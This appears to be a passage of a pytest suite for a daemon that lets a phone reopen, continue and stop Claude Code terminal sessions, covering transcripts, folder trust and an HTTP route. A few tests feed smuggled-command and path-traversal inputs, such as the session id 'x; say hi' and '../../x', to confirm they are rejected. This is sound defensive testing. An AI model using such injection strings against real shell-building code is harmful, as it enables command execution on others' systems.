    assert asyncio.run(work.stop(sid)) == (409, {"ok": False, "reason": work_sessions.NOT_OURS})
    assert mac.killed == []
    # once it has ended again, stop is the same answer as before and signals nothing
    del mac.procs[31]
    del reg.peers[sid]
    assert asyncio.run(work.stop(sid)) == (200, {"ok": True, "stopped": True}) and mac.killed == []


def test_a_look_never_ends_a_session_that_was_reopened_while_it_ran(tmp_path: Path) -> None:
    """The list judges on a worker thread; a continue can reopen the same record meanwhile. Ending it then would
    delete the task its new window is about to read."""
    now = {"t": 1000.0}
    work, mac = make(tmp_path, clock=lambda: now["t"])
    sid = start(work, "hello")[1]["session"]["id"]
    now["t"] += work_sessions.GRACE_SECS + 1                                    # no claude: the look finds it gone
    rows = work._rows

    def racing(*args: Any) -> Any:
        out = rows(*args)
        work.records[sid].created_at = now["t"]                                 # reopened while the look ran
        return out

    work._rows = racing                                                         # type: ignore[method-assign]
    asyncio.run(work.list())
    assert not work.records[sid].over and (tmp_path / "home" / "work" / f"{sid}.task").exists()
    work._rows = rows                                                           # type: ignore[method-assign]
    now["t"] += work_sessions.GRACE_SECS + 1
    asyncio.run(work.list())
    assert work.records[sid].over and not (tmp_path / "home" / "work" / f"{sid}.task").exists()


def test_only_a_checked_session_id_reaches_the_terminal_line(tmp_path: Path) -> None:
    work, mac = make(tmp_path)
    got = asyncio.run(work._open("go", "", 1000.0, sid="x; say hi"))
    assert got == (None, work_sessions.UNKNOWN) and mac.scripts == [] and work.records == {}


def test_a_reopen_that_terminal_refuses_leaves_the_session_ended(tmp_path: Path) -> None:
    now = {"t": 1000.0}
    work, mac = make(tmp_path, clock=lambda: now["t"])
    sid = start(work, "hello")[1]["session"]["id"]
    root = tmp_path / "personal" / "work"
    transcript(work_sessions.derived_transcript(root, sid, tmp_path / "claude"), [line("user", "hello")])
    now["t"] += work_sessions.GRACE_SECS + 1
    assert asyncio.run(work.detail(sid))[1]["ended"] is True
    saved = work.records[sid].saved()
    mac.open_answer = (1, "Not authorized")
    assert asyncio.run(work.continue_session(sid, "again"))[0] == 503
    assert work.records[sid].saved() == saved and work.records[sid].over          # put back as it was
    assert not (tmp_path / "home" / "work" / f"{sid}.task").exists()


def test_a_session_only_its_transcript_knows_can_be_shown_and_reopened(tmp_path: Path) -> None:
    """The daemon forgets a session at its SessionEnd hook, but the phone may still hold its id: its sheet shows it
    ended, from its transcript, and it can be reopened."""
    reg = Registry()
    work, mac = make(tmp_path, reg=reg)
    cwd = tmp_path / "code" / "site"
    cwd.mkdir(parents=True)
    trust(tmp_path, cwd)
    transcript(tmp_path / "claude" / "projects" / "-code-site" / f"{OTHER}.jsonl", [
        {"type": "user", "cwd": str(cwd), "timestamp": "2026-10-26T10:00:00Z",
         "message": {"role": "user", "content": "Ship it"}}])
    out = asyncio.run(work.detail(OTHER))[1]
    assert out["ended"] is True and out["session"]["can_continue"] is True and out["turns"][0]["text"] == "Ship it"
    assert asyncio.run(work.reply(OTHER, "hi")) == (409, {"ok": False, "reason": work_sessions.ENDED,
                                                          "code": work_sessions.ENDED_CODE})
    assert asyncio.run(work.continue_session(OTHER, "and the docs"))[1]["delivered"] == "resumed"
    assert opened(mac)[0][0].startswith(f"cd {shlex.quote(str(cwd))} && ")


def test_the_continue_route(tmp_path: Path) -> None:
    state = State()
    work, mac = make(tmp_path, state=state)
    adopted(tmp_path, state)

    async def go() -> None:
        server, port, token = await serve(tmp_path, FakeInlet(store_at(tmp_path)), work=lambda: work)
        path = f"{link_chat.SESSIONS_PATH}/{OTHER}/continue"
        assert (await http(port, "GET", path, token=token))[0] == 405
        assert (await http(port, "POST", path, {"text": ""}, token=token))[0] == 400
        status, _, raw = await http(port, "POST", path, {"text": "keep going", "client_id": "k"}, token=token)
        got = json.loads(raw)
        assert status == 200 and got["delivered"] == "resumed" and got["session"]["id"] == OTHER
        assert got["session"]["from_work"] is True
        await server.close()

    asyncio.run(go())


def test_a_session_whose_shell_moved_reopens_in_the_folder_it_started_in(tmp_path: Path) -> None:
    """A hook's cwd is the shell's folder now (after ``cd rust``); the transcript's first cwd is the project."""
    state = State()
    work, mac = make(tmp_path, state=state)
    project = tmp_path / "code" / "eve"
    sub = project / "rust"
    sub.mkdir(parents=True)
    trust(tmp_path, tmp_path / "code")
    state.session_start(OTHER, cwd=str(sub))
    state.sessions[OTHER].started_at = 0.0
    path = transcript(tmp_path / "claude" / "projects" / "-code-eve" / f"{OTHER}.jsonl", [
        {"type": "user", "cwd": str(project), "timestamp": "2026-10-20T10:00:00Z",
         "message": {"role": "user", "content": "Make the hooks fast"}},
        {"type": "assistant", "cwd": str(sub), "timestamp": "2026-10-20T10:01:00Z",
         "message": {"role": "assistant", "content": [{"type": "text", "text": "Done."}]}}])
    assert work_sessions.transcript_cwd(path) == str(project)
    assert asyncio.run(work.detail(OTHER))[1]["session"]["folder"] == "eve"
    out = asyncio.run(work.continue_session(OTHER, "go on"))[1]
    assert out["session"]["folder"] == "eve"
    assert mac.scripts[-1][1][0].startswith(f"cd {shlex.quote(str(project))} && ")
    # a start folder that is gone: the shell's folder, which is there
    work.records.clear()
    path.write_text(path.read_text().replace(str(project), str(tmp_path / "deleted"), 1))
    asyncio.run(work.continue_session(OTHER, "again"))
    assert mac.scripts[-1][1][0].startswith(f"cd {shlex.quote(str(sub))} && ")
    assert work_sessions.transcript_cwd(None) == "" and work_sessions.transcript_cwd(tmp_path / "none") == ""


def test_continue_refuses_a_folder_claude_was_never_trusted_in(tmp_path: Path) -> None:
    """An interactive claude in an untrusted folder stops at the trust prompt before its first prompt, and the
    phone cannot press it: refuse with the reason instead of opening a window that waits (found live 2026-10-20)."""
    state = State()
    work, mac = make(tmp_path, state=state)
    adopted(tmp_path, state)
    claude_state = tmp_path / "claude" / ".claude.json"
    claude_state.write_text(json.dumps({"projects": {str(tmp_path / "code"): {"hasTrustDialogAccepted": False}}}))
    assert asyncio.run(work.continue_session(OTHER, "go")) == (409, {"ok": False, "reason": work_sessions.UNTRUSTED,
                                                                       "code": "untrusted"})
    assert asyncio.run(work.detail(OTHER))[1]["session"]["can_continue"] is False
    assert mac.scripts == []
    assert work_sessions.folder_trusted(str(tmp_path / "code" / "eve"), tmp_path / "claude") is False
    claude_state.write_text("not json")                                   # unreadable: never blocks
    assert work_sessions.folder_trusted(str(tmp_path / "code" / "eve"), tmp_path / "claude") is None
    claude_state.write_text(json.dumps({"projects": {str(tmp_path): {"hasTrustDialogAccepted": True}}}))
    assert asyncio.run(work.detail(OTHER))[1]["session"]["can_continue"] is True
    assert asyncio.run(work.continue_session(OTHER, "go"))[0] == 200     # a trusted folder above it: positive control


def test_launch_drops_an_inherited_claude_session_marker(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """A Terminal first started from inside a Claude Code session hands its markers on; a claude that inherits
    CLAUDE_CODE_CHILD_SESSION saves no transcript, so the phone would see nothing."""
    work, _ = make(tmp_path)
    sid = start(work, "hello")[1]["session"]["id"]
    for name in work_sessions.INHERITED_SESSION_ENV:
        monkeypatch.setenv(name, "1")
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", "/keep/me")
    launched(tmp_path, sid)
    assert not any(name in os.environ for name in work_sessions.INHERITED_SESSION_ENV)
    assert os.environ["CLAUDE_CONFIG_DIR"] == "/keep/me"


def test_launch_takes_only_launch_or_resume_and_a_session_id(tmp_path: Path) -> None:
    for bad in (["fork", SID], ["launch", "../../x"], ["resume"], ["launch", SID, "--", "x"]):
        assert work_sessions.main(bad, home=tmp_path, execvp=lambda f, a: None) == 2
    with pytest.raises(ValueError):
        work_sessions.launch_argv("not-a-uuid", "x", Path("/m.json"))


# ---- the daemon's inbox ----------------------------------------------------------------------------------------

def test_the_daemon_runs_one_inbox_and_a_sessions_answer_is_only_logged(tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
                                                                        caplog: pytest.LogCaptureFixture) -> None:
    from eve_bridge import daemon

    made: list[Any] = []

    class FakeInbox:
        def __init__(self, on_message: Any, *, on_receipt: Any = None) -> None:
            self.on_message = on_message
            self.on_receipt = on_receipt
            self.address = ""
            self.closed = False
            made.append(self)

        async def start(self) -> None:
            self.address = EVE_FROM

        async def close(self) -> None:
            self.closed = True

    monkeypatch.setattr(claude_peer, "Inbox", FakeInbox)
    work, mac = make(tmp_path)

    async def go() -> None:
        host = SimpleNamespace(_work=work, _shutdown=asyncio.Event())
        task = asyncio.create_task(daemon.Daemon._work_inbox(host))
        await asyncio.sleep(0.01)
        assert work.eve_addresses == {EVE_FROM} and not made[0].closed
        with caplog.at_level(logging.INFO, logger="eve_bridge.work_sessions"):
            made[0].on_message("uds:/tmp/cc-socks/9.sock", "proj-a1", "secret plan: delete the repo")
            made[0].on_receipt("6f1c2a2e-1111-4222-8333-444455556666", "delivered", "Approved on the Mac.")
        host._shutdown.set()
        await task
        assert made[0].closed

    asyncio.run(go())
    assert "secret plan" not in caplog.text and "28 characters" in caplog.text
    assert "answered on the Mac (delivered)" in caplog.text and "Approved" not in caplog.text
    assert mac.scripts == []                                              # eve never acts on what it hears

    class Broken(FakeInbox):
        async def start(self) -> None:
            raise OSError("address in use")

    monkeypatch.setattr(claude_peer, "Inbox", Broken)
    work2, _ = make(tmp_path / "2")
    with caplog.at_level(logging.WARNING, logger="eve_bridge.daemon"):
        asyncio.run(daemon.Daemon._work_inbox(SimpleNamespace(_work=work2, _shutdown=asyncio.Event())))
    assert "inbox did not start" in caplog.text and work2.eve_addresses == set()
    assert asyncio.run(daemon.Daemon._work_inbox(SimpleNamespace(_work=None))) is None    # Work off: no inbox
